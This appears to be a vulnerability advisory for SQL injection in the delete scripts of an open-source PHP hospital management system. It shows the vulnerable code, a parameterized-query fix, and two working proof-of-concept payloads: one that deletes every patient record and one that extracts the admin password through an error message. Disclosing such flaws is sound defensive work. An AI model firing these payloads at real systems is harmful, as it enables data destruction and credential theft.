# SQL Injection — Hospital Management System (DELETE Operations)

**Repository:** https://github.com/blackburn3333/Hospital-Management-System  
**GitHub Issue:** https://github.com/blackburn3333/Hospital-Management-System/issues/1  
**Severity:** Critical (CVSS v3.1: 9.8)  
**CWE:** CWE-89  
**CVE:** Pending  
**Discovered:** 2026-06-19

## Vulnerable Code

### `deletepet.php`
```php
$id = $_REQUEST['id'];
$query = "DELETE FROM `patient` WHERE `pet_id`=$id";
$result = mysqli_query($con, $query) or die(mysqli_error());
```

### `deletestf.php`
```php
$id = $_REQUEST['id'];
$query = "DELETE FROM `staff` WHERE `staffID`=$id";
$result = mysqli_query($con, $query) or die(mysqli_error());
```

## Proof of Concept

```
GET /deletepet.php?id=1 OR 1=1
```

**Result:** All patient records deleted.

**Error-based data extraction:**
```
GET /deletepet.php?id=1 AND extractvalue(1,concat(0x7e,(SELECT password FROM admin LIMIT 1)))
```

## Fix
```php
$id = (int) $_REQUEST['id'];
$stmt = $con->prepare("DELETE FROM `patient` WHERE `pet_id`=?");
$stmt->bind_param("i", $id);
$stmt->execute();
```
